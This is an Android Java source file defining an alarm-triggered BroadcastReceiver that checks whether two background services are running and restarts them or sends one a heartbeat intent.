package com.icontrol.protector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class alarme extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null) {
            new Thread(() -> {
                if (intent.getBooleanExtra("FROM_ALARM", false)) {

                    try {

                        Intent workint = new Intent(context, EngineWorker.class);
                        if (!MyCods.isServiceRunning(context, EngineWorker.class)) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                context.startForegroundService(workint);
                            } else {
                                context.startService(workint);
                            }
                        }

                        if (!MyCods.isServiceRunning(context, WorkServices.class)) {
                            Intent workint2 = new Intent(context, WorkServices.class);
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                context.startForegroundService(workint2);
                            } else {
                                context.startService(workint2);
                            }
                        } else {
                            try {
                                Intent hbint = new Intent(context, WorkServices.class);
                                hbint.putExtra("FROM_ALARM", true);
                                context.startService(hbint);
                            } catch (Exception s) {
                            }
                        }
                    } catch (Exception e) {

                    }
                    //return START_STICKY;
                }


            }).start();
        }

    }
}
